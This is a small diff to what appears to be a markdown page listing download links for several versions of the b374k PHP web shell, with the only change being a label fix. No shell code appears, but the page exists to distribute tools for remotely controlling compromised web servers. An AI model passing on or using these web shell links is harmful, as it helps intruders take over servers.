@@ -18,7 +18,7 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/9luy9sjioxo8p2p/b374k-0.1_shell.php/file">b374k-0.1</a>
 <img src="https://imgur.com/8iKWJo6.png" alt="beruangsalju profile">
 
-# <a href="https://www.mediafire.com/file/plnw8o70brfzykh/b374k-2.8_shell.php/file">b374k_2.8</a>
+# <a href="https://www.mediafire.com/file/plnw8o70brfzykh/b374k-2.8_shell.php/file">b374k-2.8</a>
 <img src="https://imgur.com/ErJ3K43.png" alt="beruangsalju profile">
 
 # <a href="https://beruangsalju.github.io/shell/b374k-3.2.3.php">b374k-3.2.3</a>
